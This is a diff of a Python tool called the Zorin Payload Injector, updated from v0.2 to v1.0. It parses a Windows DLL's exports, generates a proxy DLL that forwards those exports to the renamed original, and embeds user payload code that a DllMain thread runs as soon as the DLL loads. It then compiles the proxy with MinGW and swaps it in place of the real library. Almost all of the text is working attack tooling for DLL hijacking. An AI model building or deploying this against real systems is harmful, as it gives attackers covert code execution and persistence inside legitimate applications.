@@ -1,300 +1,305 @@
-# Copyright (c) 2025 Zorin Injector Project
-
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to deal
-# in the Software without restriction, including without limitation the rights
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-
-# The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the Software.
-
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-# SOFTWARE.
-
 #!/usr/bin/env python3
 """
-Zorin Payload Injector v0.2
+Zorin Payload Injector v1.0 (Enhanced Edition)
+Pure Python PE Parser + Modern C/C++ Proxy Generator
 """
 
 import sys
 import os
 import struct
 import subprocess
-import tempfile
 import shutil
+import argparse
 from pathlib import Path
 
+# Fix Windows console UTF-8 output
+if sys.platform == "win32":
+    try:
+        if hasattr(sys.stdout, 'reconfigure'):
+            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+        if hasattr(sys.stderr, 'reconfigure'):
+            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
+    except Exception:
+        pass
+
+class PEParser:
+    """Pure Python PE export extractor (No dumpbin or external dependencies required)"""
+    @staticmethod
+    def get_exports(dll_path):
+        dll_path = Path(dll_path)
+        with open(dll_path, 'rb') as f:
+            data = f.read()
+
+        if len(data) < 64:
+            return []
+
+        # 1. DOS Header
+        if data[:2] != b'MZ':
+            return []
+        
+        e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
+        if e_lfanew + 4 + 20 > len(data):
+            return []
+
+        # 2. NT Signature
+        if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
+            return []
+
+        file_header_offset = e_lfanew + 4
+        machine, num_sections = struct.unpack_from('<HH', data, file_header_offset)[:2]
+        opt_hdr_size = struct.unpack_from('<H', data, file_header_offset + 16)[0]
+        opt_hdr_offset = file_header_offset + 20
+
+        opt_magic = struct.unpack_from('<H', data, opt_hdr_offset)[0]
+        export_rva = 0
+        export_size = 0
+
+        if opt_magic == 0x10B: # PE32 (32-bit)
+            rva_count = struct.unpack_from('<I', data, opt_hdr_offset + 92)[0]
+            if rva_count > 0:
+                export_rva, export_size = struct.unpack_from('<II', data, opt_hdr_offset + 96)
+        elif opt_magic == 0x20B: # PE32+ (64-bit)
+            rva_count = struct.unpack_from('<I', data, opt_hdr_offset + 108)[0]
+            if rva_count > 0:
+                export_rva, export_size = struct.unpack_from('<II', data, opt_hdr_offset + 112)
+        else:
+            return []
+
+        if export_rva == 0 or export_size == 0:
+            return []
+
+        # 3. Read Section Headers to convert RVA to File Offset
+        sec_offset = opt_hdr_offset + opt_hdr_size
+        sections = []
+        for i in range(num_sections):
+            curr_sec = sec_offset + (i * 40)
+            if curr_sec + 40 > len(data):
+                break
+            v_size, v_addr, raw_size, raw_ptr = struct.unpack_from('<IIII', data, curr_sec + 8)
+            sec_len = v_size if v_size > 0 else raw_size
+            sections.append((v_addr, sec_len, raw_ptr))
+
+        def rva_to_offset(rva):
+            for v_addr, sec_len, raw_ptr in sections:
+                if v_addr <= rva < v_addr + sec_len:
+                    return (rva - v_addr) + raw_ptr
+            return None
+
+        exp_offset = rva_to_offset(export_rva)
+        if exp_offset is None or exp_offset + 40 > len(data):
+            return []
+
+        n_base, num_funcs, num_names, addr_funcs, addr_names, addr_ords = struct.unpack_from(
+            '<IIIIII', data, exp_offset + 16
+        )
+
+        offset_funcs = rva_to_offset(addr_funcs)
+        offset_names = rva_to_offset(addr_names)
+        offset_ords = rva_to_offset(addr_ords)
+
+        if not offset_funcs:
+            return []
+
+        # Map name ordinals to function names
+        names_by_ord = {}
+        if offset_names and offset_ords:
+            for i in range(num_names):
+                name_rva = struct.unpack_from('<I', data, offset_names + (i * 4))[0]
+                ord_val = struct.unpack_from('<H', data, offset_ords + (i * 2))[0]
+                n_off = rva_to_offset(name_rva)
+                if n_off:
+                    end = data.find(b'\x00', n_off)
+                    if end != -1:
+                        func_name = data[n_off:end].decode('ascii', errors='ignore')
+                        names_by_ord[ord_val] = func_name
+
+        exports = []
+        for i in range(num_funcs):
+            func_rva = struct.unpack_from('<I', data, offset_funcs + (i * 4))[0]
+            if func_rva == 0:
+                continue
+            name = names_by_ord.get(i, f"ord_{n_base + i}")
+            exports.append((name, n_base + i))
+
+        return exports
+
+
 class DLLInjector:
-    def __init__(self, dll_path, payload_path, output_path=None):
-        self.dll_path = Path(dll_path)
-        self.payload_path = Path(payload_path)
-        self.output_path = Path(output_path) if output_path else self.dll_path
+    def __init__(self, dll_path, payload_path, output_path=None, backup_suffix="_org"):
+        self.dll_path = Path(dll_path).resolve()
+        self.payload_path = Path(payload_path).resolve()
+        self.output_path = Path(output_path).resolve() if output_path else self.dll_path
+        self.backup_suffix = backup_suffix
         
         if not self.dll_path.exists():
             raise FileNotFoundError(f"DLL not found: {dll_path}")
         if not self.payload_path.exists():
             raise FileNotFoundError(f"Payload not found: {payload_path}")
-    
+
     def get_dll_exports(self):
-        """Extract exported functions from the original DLL"""
-        print("[+] Extracting exports from original DLL")
+        """Extract exported functions from the original DLL using pure Python PE parser"""
+        print("[+] Extracting exports from original DLL via built-in PE parser...")
+        exports = PEParser.get_exports(self.dll_path)
         
-        cmd = ['dumpbin', '/exports', str(self.dll_path)]
-        
-        try:
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            
-            if result.returncode != 0:
-                print("[!] dumpbin not available")
-                return []
-            
-            exports = []
-            in_exports = False
-            
-            for line in result.stdout.split('\n'):
-                if 'ordinal hint' in line.lower():
-                    in_exports = True
-                    continue
-                
-                if in_exports and line.strip():
-                    parts = line.split()
-                    if len(parts) >= 4:
-                        func_name = parts[-1]
-                        if func_name and not func_name.startswith('['):
-                            exports.append(func_name)
-            
-            print(f"[+] Found {len(exports)} exported functions")
-            return exports
-            
-        except FileNotFoundError:
-            print("[!] dumpbin not found in PATH")
-            return []
-    
-    def create_proxy_dll_source(self):
-        """Create proxy DLL source code with embedded payload"""
-        print("[+] Creating proxy DLL source code")
-        
-        # Read user payload
-        with open(self.payload_path, 'r') as f:
-            payload_code = f.read()
-        
-        # Remove duplicate includes and rename payload function
-        if '#include <windows.h>' in payload_code:
-            payload_code = payload_code.replace('#include <windows.h>', '')
-        if '#include <stdio.h>' in payload_code:
-            payload_code = payload_code.replace('#include <stdio.h>', '')
-        if 'void payload()' in payload_code:
-            payload_code = payload_code.replace('void payload()', 'void user_payload()')
-        
-        # Create proxy DLL source with safe initialization
-        proxy_code = f'''
-#define _WIN32_WINNT 0x0600
-#include <windows.h>
-#include <stdio.h>
-#include <process.h>
+        # Fallback to dumpbin if available and native returned 0
+        if not exports:
+            cmd = ['dumpbin', '/exports', str(self.dll_path)]
+            try:
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                if result.returncode == 0:
+                    in_exports = False
+                    for line in result.stdout.split('\n'):
+                        if 'ordinal hint' in line.lower():
+                            in_exports = True
+                            continue
+                        if in_exports and line.strip():
+                            parts = line.split()
+                            if len(parts) >= 4:
+                                func_name = parts[-1]
+                                if func_name and not func_name.startswith('['):
+                                    exports.append((func_name, len(exports) + 1))
+            except FileNotFoundError:
+                pass
 
-#pragma comment(lib, "user32.lib")
-
-// User payload code
-{payload_code}
-
-HMODULE g_original_dll = NULL;
-BOOL g_payload_executed = FALSE;
-
-// Safe payload execution thread
-unsigned __stdcall PayloadThread(void* param) {{
-    user_payload();
-    return 0;
-}}
-
-// Delayed initialization thread
-unsigned __stdcall InitThread(void* param) {{
-    // Wait a moment for process to stabilize
-    Sleep(100);
-    
-    if (!g_payload_executed) {{
-        g_payload_executed = TRUE;
-        
-        // Create payload thread
-        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, PayloadThread, NULL, 0, NULL);
-        if (hThread) {{
-            CloseHandle(hThread);
-        }}
-    }}
-    
-    return 0;
-}}
-
-// DllMain - Entry point
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
-    switch (fdwReason) {{
-        case DLL_PROCESS_ATTACH: {{
-            // Get current DLL path
-            char dll_path[MAX_PATH];
-            GetModuleFileNameA(hinstDLL, dll_path, MAX_PATH);
-            
-            // Build path to original DLL
-            char original_path[MAX_PATH];
-            strcpy_s(original_path, MAX_PATH, dll_path);
-            char* last_dot = strrchr(original_path, '.');
-            if (last_dot) {{
-                strcpy_s(last_dot, MAX_PATH - (last_dot - original_path), "_org.dll");
-            }}
-            
-            // Load original DLL
-            g_original_dll = LoadLibraryA(original_path);
-            if (!g_original_dll) {{
-                // Fallback to original name
-                char fallback_path[MAX_PATH];
-                GetModuleFileNameA(NULL, fallback_path, MAX_PATH);
-                // Find directory and try original name
-            }}
-            
-            // Create initialization thread (non-blocking)
-            HANDLE hInitThread = (HANDLE)_beginthreadex(NULL, 0, InitThread, NULL, 0, NULL);
-            if (hInitThread) {{
-                CloseHandle(hInitThread);
-            }}
-            
-            break;
-        }}
-        
-        case DLL_PROCESS_DETACH: {{
-            if (g_original_dll) {{
-                FreeLibrary(g_original_dll);
-                g_original_dll = NULL;
-            }}
-            break;
-        }}
-    }}
-    
-    return TRUE;
-}}
-
-// Export forwarding via pragma (if exports.def not used)
-#pragma comment(linker, "/EXPORT:DllMain")
-    '''
-        
-        # Save proxy source
-        proxy_path = self.payload_path.with_name('proxy_dll.c')
-        with open(proxy_path, 'w') as f:
-            f.write(proxy_code)
-        
-        print(f"[+] Proxy source created: {proxy_path}")
-        return proxy_path
+        print(f"[+] Found {len(exports)} exported functions")
+        return exports
 
     def create_def_file(self, exports, dll_name):
         """Create DEF file for export forwarding"""
-        def_content = f"LIBRARY {dll_name}\n"
-        def_content += "EXPORTS\n"
+        org_lib_name = f"{dll_name}{self.backup_suffix}"
+        def_content = f"LIBRARY \"{dll_name}\"\nEXPORTS\n"
         
-        for i, export in enumerate(exports, 1):
-            def_content += f"    {export}={dll_name}_org.{export} @{i}\n"
+        for name, ordinal in exports:
+            def_content += f"    {name} = {org_lib_name}.{name} @{ordinal}\n"
         
-        def_path = self.payload_path.with_name('exports.def')
+        def_path = self.dll_path.parent / f"{dll_name}_proxy.def"
         with open(def_path, 'w') as f:
             f.write(def_content)
         
-        print(f"[+] Created DEF file with {len(exports)} exports")
+        print(f"[+] Created DEF file with {len(exports)} exports: {def_path.name}")
         return def_path
-    
-    def compile_proxy_dll(self, proxy_source, def_file, temp_output):
-        """Compile proxy DLL"""
-        print("[+] Compiling proxy DLL with MinGW")
+
+    def create_proxy_dll_source(self):
+        """Create proxy DLL source code with embedded payload safely"""
+        print("[+] Creating proxy DLL source code...")
         
+        with open(self.payload_path, 'r', encoding='utf-8', errors='ignore') as f:
+            payload_code = f.read()
+
+        call_target = "payload()"
+        if "user_payload" in payload_code and "payload()" not in payload_code:
+            call_target = "user_payload()"
+
+        proxy_code = f'''/* Zorin Proxy Source */
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <process.h>
+#include <stdio.h>
+
+/* Embedded Payload */
+#line 1 "{self.payload_path.name}"
+{payload_code}
+
+static volatile LONG g_executed = 0;
+static HMODULE g_hOriginal = NULL;
+
+static DWORD WINAPI ZorinWorker(LPVOID lpParam) {{
+    (void)lpParam;
+    Sleep(50);
+    {call_target};
+    return 0;
+}}
+
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {{
+    (void)reserved;
+    if (reason == DLL_PROCESS_ATTACH) {{
+        DisableThreadLibraryCalls(hinst);
+        if (InterlockedCompareExchange(&g_executed, 1, 0) == 0) {{
+            HANDLE h = CreateThread(NULL, 0, ZorinWorker, NULL, 0, NULL);
+            if (h) CloseHandle(h);
+        }}
+    }}
+    return TRUE;
+}}
+'''
+        proxy_path = self.dll_path.parent / f"{self.dll_path.stem}_proxy.cpp"
+        with open(proxy_path, 'w', encoding='utf-8') as f:
+            f.write(proxy_code)
+        
+        print(f"[+] Proxy source created: {proxy_path.name}")
+        return proxy_path
+
+    def compile_proxy_dll(self, proxy_source, def_file, temp_output):
+        """Compile proxy DLL using g++ or gcc"""
+        print("[+] Compiling proxy DLL with MinGW...")
+        
+        compiler = "g++" if shutil.which("g++") else "gcc"
         cmd = [
-            'gcc',
+            compiler,
             '-shared',
+            '-O2',
+            '-s',
             '-o', str(temp_output),
             str(proxy_source),
+            str(def_file),
             '-Wl,--enable-stdcall-fixup',
-            '-Wl,--subsystem,windows',
-            '-static-libgcc'
+            '-static-libgcc',
+            '-static-libstdc++',
+            '-luser32',
+            '-lkernel32'
         ]
         
-        if def_file and def_file.exists():
-            cmd.insert(-3, str(def_file))
-        
-        cmd.extend(['-luser32', '-lkernel32'])
-        
         result = subprocess.run(cmd, capture_output=True, text=True)
-        
         if result.returncode != 0:
             raise RuntimeError(f"Compilation failed:\n{result.stderr}")
         
-        print(f"[+] Compilation successful")
+        print(f"[+] Compilation successful! Output size: {temp_output.stat().st_size:,} bytes")
         return temp_output
-    
-    def inject(self):
-        """Perform injection"""
+
+    def inject(self, force=False):
+        """Perform DLL proxy injection"""
         try:
-            print("\n[*] Zorin DLL Injector v0.2 \n")
+            print("\n" + "="*58)
+            print("  Zorin DLL Proxy Injector (Python Edition v1.0)")
+            print("="*58 + "\n")
             
-            original_backup = self.dll_path.with_name(
-                f"{self.dll_path.stem}_org{self.dll_path.suffix}")
-            temp_dll = self.dll_path.with_name(
-                f"{self.dll_path.stem}_temp{self.dll_path.suffix}")
+            original_backup = self.dll_path.parent / f"{self.dll_path.stem}{self.backup_suffix}{self.dll_path.suffix}"
+            temp_dll = self.dll_path.parent / f"{self.dll_path.stem}_temp{self.dll_path.suffix}"
             
-            if original_backup.exists():
-                print(f"[!] Backup exists: {original_backup}")
-                response = input("[?] Delete and continue? (y/n): ")
-                if response.lower() != 'y':
+            if original_backup.exists() and not force:
+                print(f"[!] Backup already exists: {original_backup}")
+                resp = input("[?] Overwrite existing backup? (y/N): ")
+                if resp.lower() != 'y':
+                    print("[-] Aborted.")
                     return False
                 original_backup.unlink()
             
-            # Get exports
             exports = self.get_dll_exports()
+            if not exports:
+                print("[!] Warning: Target DLL exports are empty or could not be detected.")
             
-            # Create DEF file
-            def_file = None
-            if exports:
-                def_file = self.create_def_file(exports, self.dll_path.stem)
-            
-            # Create proxy source
+            def_file = self.create_def_file(exports, self.dll_path.stem)
             proxy_source = self.create_proxy_dll_source()
             
-            # Compile
             self.compile_proxy_dll(proxy_source, def_file, temp_dll)
             
-            # Verify size
-            dll_size = temp_dll.stat().st_size
-            print(f"[+] Compiled DLL size: {dll_size:,} bytes")
-            
-            # Perform swap
-            print(f"\n[+] Performing DLL swap...")
-            shutil.move(str(self.dll_path), str(original_backup))
-            print(f"[✓] Original backed up")
+            print(f"\n[+] Performing atomic DLL swap...")
+            if self.dll_path.exists():
+                shutil.move(str(self.dll_path), str(original_backup))
+                print(f"[✓] Original backed up to: {original_backup.name}")
             
             shutil.move(str(temp_dll), str(self.dll_path))
-            print(f"[✓] Proxy installed")
+            print(f"[✓] Proxy installed: {self.dll_path.name}")
             
-            # Cleanup
+            # Clean up temporary sources
             proxy_source.unlink(missing_ok=True)
-            if def_file:
-                def_file.unlink(missing_ok=True)
+            def_file.unlink(missing_ok=True)
             
-            temp_path = os.environ.get('TEMP', 'C:\\Temp')
-            
-            print("\n" + "="*60)
-            print("[✓] INJECTION COMPLETED!")
-            print("="*60)
-            print(f"\n[!] DEBUG FILES TO CHECK:")
-            print(f"    1. {os.path.join(temp_path, 'zorin_injection.log')}")
-            print(f"    2. C:\\zorin_debug.log")
-            print(f"    3. C:\\zorin_payload_started.txt")
-            print(f"    4. C:\\zorin_payload_success.txt")
-            print(f"\n[!] RUN APPLICATION:")
-            print(f"    - Execute: nmap (or any command)")
-            print(f"    - Payload will execute IMMEDIATELY on DLL load")
-            print(f"    - Check debug files above for confirmation\n")
-            
+            print("\n" + "="*58)
+            print("[✓] INJECTION COMPLETED SUCCESSFULLY!")
+            print("="*58)
+            print(f"  • Backup DLL: {original_backup}")
+            print(f"  • Active Proxy: {self.dll_path}\n")
             return True
             
         except Exception as e:
@@ -303,43 +308,62 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
             traceback.print_exc()
             return False
 
+def restore(target_dll, backup_suffix="_org"):
+    target = Path(target_dll).resolve()
+    backup = target.parent / f"{target.stem}{backup_suffix}{target.suffix}"
+    print(f"[*] Restoring: {target.name}")
+    if not backup.exists():
+        print(f"[✗] Backup file not found: {backup}")
+        return False
+    if target.exists():
+        target.unlink()
+    shutil.move(str(backup), str(target))
+    print(f"[✓] Restored original DLL from {backup.name}")
+    return True
 
-def print_usage():
-    print("""
-╔════════════════════════════════════════════════════════════╗
-║  Zorin DLL Injector v0.2 - Aggressive Execution          ║
-╚════════════════════════════════════════════════════════════╝
-
-Usage: python zorin.py <dll> <payload.c>
-
-New in v0.2:
-  • Immediate payload execution (no delay)
-  • Multiple execution attempts
-  • Enhanced logging to multiple locations
-  • Marker files for debugging
-  • Better error handling
-
-
-""")
-
+def list_exports(target_dll):
+    target = Path(target_dll).resolve()
+    if not target.exists():
+        print(f"[✗] File not found: {target}")
+        return
+    exports = PEParser.get_exports(target)
+    print(f"\n[*] Exports for {target.name} (Total: {len(exports)}):")
+    print("-" * 50)
+    for name, ord_val in exports:
+        print(f"  @{ord_val:<6} {name}")
+    print("-" * 50 + "\n")
 
 def main():
-    if len(sys.argv) < 3:
-        print_usage()
-        sys.exit(1)
-    
-    dll_path = sys.argv[1]
-    payload_path = sys.argv[2]
-    
-    print("╔" + "="*58 + "╗")
-    print("║  Zorin DLL Injector v0.2             ║")
-    print("╚" + "="*58 + "╝")
-    
-    injector = DLLInjector(dll_path, payload_path)
-    success = injector.inject()
-    
-    sys.exit(0 if success else 1)
+    parser = argparse.ArgumentParser(description="Zorin DLL Injector & Proxy Generator")
+    parser.add_argument("dll", nargs="?", help="Target DLL to proxy")
+    parser.add_argument("payload", nargs="?", help="C/C++ payload source file")
+    parser.add_argument("-r", "--restore", action="store_true", help="Restore original DLL from backup")
+    parser.add_argument("-l", "--list-exports", action="store_true", help="List exported functions")
+    parser.add_argument("-b", "--backup-suffix", default="_org", help="Backup suffix (default: _org)")
+    parser.add_argument("-f", "--force", action="store_true", help="Force overwrite without confirmation")
+    args = parser.parse_args()
 
+    if args.list_exports:
+        if not args.dll:
+            print("[✗] Error: target DLL required for --list-exports")
+            sys.exit(1)
+        list_exports(args.dll)
+        return
+
+    if args.restore:
+        if not args.dll:
+            print("[✗] Error: target DLL required for --restore")
+            sys.exit(1)
+        ok = restore(args.dll, args.backup_suffix)
+        sys.exit(0 if ok else 1)
+
+    if not args.dll or not args.payload:
+        parser.print_help()
+        sys.exit(1)
+
+    injector = DLLInjector(args.dll, args.payload, backup_suffix=args.backup_suffix)
+    ok = injector.inject(force=args.force)
+    sys.exit(0 if ok else 1)
 
 if __name__ == "__main__":
     main()
